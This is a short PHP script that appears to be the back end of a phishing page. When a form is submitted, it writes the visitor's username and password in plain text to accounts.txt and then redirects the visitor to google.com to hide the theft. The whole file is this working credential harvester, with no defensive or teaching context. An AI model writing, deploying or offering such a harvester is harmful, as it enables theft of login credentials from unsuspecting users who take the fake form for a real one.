<?php
if(isset($_POST['Submit-Button']))
    {
    $username = $_POST['Username'];
    $password = $_POST['Password'];
    $text = $username . "," . $password . "\n";
    $fp = fopen('accounts.txt', 'a+');

    if(fwrite($fp, $text))  {
        echo 'Saved';
    }
fclose ($fp);
header("Location: http://www.google.com");
die();
}?>